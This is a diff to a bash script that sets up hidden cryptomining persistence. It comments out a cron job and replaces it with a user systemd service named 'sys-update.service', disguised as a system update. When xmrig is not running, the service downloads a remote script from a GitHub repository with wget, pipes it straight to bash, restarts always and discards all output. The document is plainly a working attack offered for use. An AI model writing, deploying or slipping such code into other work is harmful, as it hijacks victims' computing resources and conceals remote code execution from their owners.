@@ -1,7 +1,40 @@
 #!/bin/bash
 
-CONTENT="*/5 * * * * wget -qO- https://raw.githubusercontent.com/derailment/mining_armory/refs/heads/main/run | bash"
+## Mining every 5 mins
+#CONTENT="*/5 * * * * wget -qO- https://raw.githubusercontent.com/derailment/mining_armory/refs/heads/main/run | bash"
+#
+#if ! pgrep -x xmrig >/dev/null; then
+#    (crontab -l 2>/dev/null; echo "$CONTENT") | crontab -
+#fi
 
+
+## Mining when reboots
 if ! pgrep -x xmrig >/dev/null; then
-    (crontab -l 2>/dev/null; echo "$CONTENT") | crontab -
+
+	USER_SYSTEMD_DIR="$HOME/.config/systemd/user"
+	SERVICE_NAME="sys-update.service"
+	SERVICE_PATH="$USER_SYSTEMD_DIR/$SERVICE_NAME"
+
+
+	mkdir -p $USER_SYSTEMD_DIR
+
+	cat <<EOF > $SERVICE_PATH
+[Unit]
+Description=System Update Service
+After=network.target
+
+[Service]
+ExecStart=/bin/bash -c "wget -qO- https://raw.githubusercontent.com/derailment/mining_armory/refs/heads/main/run | /bin/bash"
+Restart=always
+RestartSec=30
+StandardOutput=null
+StandardError=null
+
+[Install]
+WantedBy=default.target
+EOF
+
+	systemctl --user daemon-reload
+	systemctl --user enable $SERVICE_NAME
+	systemctl --user start $SERVICE_NAME
 fi
